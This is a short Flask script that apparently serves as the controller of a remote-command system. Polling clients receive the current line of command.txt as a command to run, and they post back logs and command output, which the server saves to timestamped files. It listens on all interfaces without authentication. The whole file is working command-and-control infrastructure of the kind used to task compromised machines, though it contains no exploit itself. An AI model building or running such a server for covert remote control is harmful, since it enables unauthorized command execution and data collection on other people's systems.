from flask import Flask, request
from time import time

app = Flask(__name__)

def saveLog(text):
    f = open('log.txt', 'a+')
    f.write(text)
    f.close()

with open('command.txt', 'w+') as f:
    f.write("")

@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == "POST":
        username = str(request.get_json()["name"]).removesuffix("\n")
        print(f"\n{username} pinged")
        command = ""
        with open('command.txt', 'r') as f:
            for line in f.readlines():
                line = line.removesuffix("\n")
                if line != "":
                    command = line
        return command
    return "home page"

@app.route('/log/', methods=['POST'])
def log():
    name = str(request.get_json()["name"]).removesuffix("\n")
    msg = str(request.get_json()["message"]).removesuffix("\n")
    status = str(request.get_json()["status"]).removesuffix("\n")
    
    text = f"\n[{status}]\n[{name}]\n[{msg}]"
    print(text)

    return ""

@app.route('/output/', methods=['POST'])
def output():
    output = str(request.get_json()["output"])
    print(output)
    name = f"output/{int(time())}.txt"
    with open(name, 'w+') as f:
        f.write(output)
    print(f"Output saved to {name}")
    return ""

app.run(port=6969,host="0.0.0.0")
